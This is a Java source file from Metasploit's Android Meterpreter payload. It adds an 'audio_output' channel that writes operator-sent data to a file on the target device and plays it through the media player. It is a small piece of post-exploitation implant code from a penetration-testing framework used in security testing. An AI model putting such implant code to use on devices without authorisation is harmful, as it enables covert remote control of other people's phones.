package com.metasploit.meterpreter.android;

import android.media.MediaPlayer;

import com.metasploit.meterpreter.Channel;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.TLVType;
import com.metasploit.meterpreter.command.NotYetImplementedCommand;
import com.metasploit.meterpreter.stdapi.Loader;
import com.metasploit.meterpreter.stdapi.stdapi_channel_open;

import java.io.ByteArrayInputStream;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;

public class android_channel_open extends stdapi_channel_open {

    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        String channelType = request.getStringValue(TLVType.TLV_TYPE_CHANNEL_TYPE);
        if (channelType.equals("audio_output")) {
            Channel channel = new AudioChannel(meterpreter);
            response.add(TLVType.TLV_TYPE_CHANNEL_ID, channel.getID());
            return ERROR_SUCCESS;
        }
        return super.execute(meterpreter, request, response);
    }

    static String fpath = Loader.expand("wav").getPath();

    static class AudioChannel extends Channel {
        public AudioChannel(Meterpreter meterpreter) throws FileNotFoundException {
            super(meterpreter, new ByteArrayInputStream(new byte[0]), new FileOutputStream(fpath, false));
        }

        @Override
        public synchronized void close() throws IOException {
            super.close();

            MediaPlayer mediaPlayer = new MediaPlayer();
            mediaPlayer.setDataSource(fpath);
            mediaPlayer.setOnCompletionListener(new MediaPlayer.OnCompletionListener() {
                @Override
                public void onCompletion(MediaPlayer mediaPlayer) {
                    mediaPlayer.release();
                }
            });
            mediaPlayer.prepare();
            mediaPlayer.start();
        }
    }

}
